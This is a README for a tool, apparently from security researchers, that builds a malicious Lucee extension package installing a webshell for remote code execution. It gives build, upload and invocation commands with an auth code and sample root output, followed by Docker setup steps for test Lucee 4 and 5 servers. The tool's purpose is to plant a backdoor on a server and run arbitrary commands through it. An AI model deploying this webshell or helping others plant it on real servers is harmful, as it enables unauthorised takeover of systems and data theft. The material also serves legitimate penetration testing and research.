
## 
### Lucee Web Shells
### Written by Juan Pablo Gomez (https://github.com/JPG0mez) and Will Vandevanter (https://github.com/BuffaloWill)

The work is originally based on research and a blog post here: [LINK]

This repository includes a python script to generate a Lucee extension that will add a webshell for remote code execution. 
It works with Lucee 5 and 4. It should work on Lucee 6 but has not been tested.

1. To use it run the `build` command:

```bash
python3 extension-generator.py build

Auth_code already set: lErs2CC2BdpUtHYW0miiSNncE
Generating LEX package...
webshell/package.lex created.
```

2. Upload `webshell/package.lex` into the Lucee installation. 

3. Then call the webshell with:

```bash
python3 extension-generator.py --url http://localhost:8888 --auth-code lErs2CC2BdpUtHYW0miiSNncE id

uid=0(root) gid=0(root) groups=0(root)
```

### Testing Lucee

The easiest way to test Lucee functionality is with Docker. There are directions below for Lucee 5 and 4:

#### Docker - Lucee 5:

Note, lucee 5 does not ship with a password. You will need to start the server with:

```
docker run --name lucee5 -p 8888:8888 --platform linux/amd64 lucee/lucee:5.3.9.141-nginx
```

After the application finishes loading, there should be a Server page at [Server Login](http://127.0.0.1:8888/lucee/admin/server.cfm) that will mention a password needing to be set. 

This can be done from the cli with:

```
docker exec lucee5 sh -c "echo 'mypassword' > /opt/lucee/server/lucee-server/context/password.txt"
```

After this click "Import File" and you should be able to login.

This blopost also has alternate information on setting the password: 

https://markdrew.io/password-for-lucee-docker

### Docker - Lucee 4 (2018):

Start the server:

```
docker run --name lucee4 -dp 8888:8080 --platform linux/amd64 lucee/lucee4:4.5.5.015
```

Browse to localhost:8888/lucee/admin/server.cfm and set the password.
